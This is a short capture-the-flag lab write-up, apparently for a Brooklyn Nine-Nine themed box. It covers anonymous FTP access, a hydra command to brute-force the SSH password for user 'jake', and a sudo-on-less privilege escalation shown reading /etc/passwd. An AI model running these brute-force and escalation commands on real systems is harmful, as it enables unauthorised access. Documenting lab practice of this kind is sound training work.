# Write up

## Keys words
- Brute force
- find info


## Links
- [[Pentesting]]


## Info
- Source code of home page `<!-- Have you ever heard of steganography? -->`
### note_to_jake.txt
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine


## Enumeration
### Nmap
- Ftp anonymous 
- http 80
- ssh

## Exploit
- Ftp anonymous `anonymous:anonymous` => note_to_jake. Command `get <file>`
- Brute force ssh `jake` password with hydra. Command ``hydra -l <username> -P <path_wordlist> <Ip> ssh

## Privilege Escalation

```bash 
sudo -l ``` => no password /usr/bin/less
Exemple:
sudo /usr/bin/less /etc/passwd
```